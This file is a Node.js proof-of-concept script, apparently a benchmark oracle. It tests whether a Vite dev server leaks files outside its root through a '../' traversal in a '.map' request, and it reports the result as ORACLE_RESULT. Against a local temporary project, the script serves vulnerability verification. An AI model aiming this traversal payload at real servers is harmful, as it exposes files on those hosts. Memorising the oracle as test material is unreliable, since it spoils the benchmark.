const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');

(async () => {
  let operation_completed = false;
  let exploit_succeeded = false;
  let evidence = '';
  let server;

  const marker = 'vite-map-traversal-' + Date.now() + '-' + Math.random().toString(16).slice(2);
  const base = path.join(os.tmpdir(), marker);
  const root = path.join(base, 'root');

  function mkReqRes(url) {
    return new Promise((resolve, reject) => {
      const req = { method: 'GET', url, headers: { accept: '*/*' } };
      const chunks = [];
      let settled = false;

      const res = {
        statusCode: 200,
        headers: {},
        setHeader(k, v) { this.headers[String(k).toLowerCase()] = v; },
        getHeader(k) { return this.headers[String(k).toLowerCase()]; },
        writeHead(code, headers) {
          this.statusCode = code;
          if (headers && typeof headers === 'object') {
            for (const key of Object.keys(headers)) this.setHeader(key, headers[key]);
          }
        },
        write(data) {
          if (data != null) chunks.push(Buffer.from(String(data)));
          return true;
        },
        end(data) {
          if (data != null) chunks.push(Buffer.from(String(data)));
          if (!settled) {
            settled = true;
            resolve({
              statusCode: this.statusCode || 200,
              body: Buffer.concat(chunks).toString('utf8'),
              viaNext: false
            });
          }
        }
      };

      try {
        server.middlewares(req, res, (err) => {
          if (settled) return;
          if (err) {
            settled = true;
            reject(err);
            return;
          }
          settled = true;
          resolve({
            statusCode: res.statusCode || 404,
            body: Buffer.concat(chunks).toString('utf8'),
            viaNext: true
          });
        });
      } catch (e) {
        if (!settled) {
          settled = true;
          reject(e);
        }
      }
    });
  }

  try {
    fs.mkdirSync(path.join(root, 'node_modules', '.vite', 'deps'), { recursive: true });

    const benignMapPath = path.join(root, 'node_modules', '.vite', 'deps', 'safe.js.map');
    const benignMap = JSON.stringify({ version: 3, file: 'safe.js', sources: ['safe.ts'], names: [], mappings: '' });
    fs.writeFileSync(benignMapPath, benignMap);

    const escapedTarget = path.join(base, 'outside-secret.txt');
    const secret = 'SECRET_' + marker;
    fs.writeFileSync(escapedTarget, secret);

    const vite = require('vite');
    if (!vite || typeof vite.createServer !== 'function') {
      throw new Error('vite.createServer unavailable');
    }

    server = await vite.createServer({
      root,
      logLevel: 'silent',
      server: { middlewareMode: true }
    });

    const benign = await mkReqRes('/node_modules/.vite/deps/safe.js.map');
    if (benign.statusCode >= 400 || benign.body.indexOf('"version":3') === -1) {
      throw new Error('benign failed status=' + benign.statusCode + ' viaNext=' + benign.viaNext);
    }

    operation_completed = true;

    const maliciousUrl = '/node_modules/.vite/deps/../../../outside-secret.txt.map';
    try {
      const mal = await mkReqRes(maliciousUrl);
      const leaked = mal.body.includes(secret);
      exploit_succeeded = leaked;
      evidence = 'benign_status=' + benign.statusCode + ';mal_status=' + mal.statusCode + ';mal_viaNext=' + mal.viaNext + ';leaked=' + leaked + ';mal_len=' + mal.body.length;
    } catch (e) {
      exploit_succeeded = false;
      evidence = 'benign_status=' + benign.statusCode + ';malicious_exception=' + (e && e.message ? e.message : String(e));
    }
  } catch (e) {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'exception=' + (e && e.message ? e.message : String(e));
  } finally {
    if (server && typeof server.close === 'function') {
      try { await server.close(); } catch (_) {}
    }
  }

  console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
})();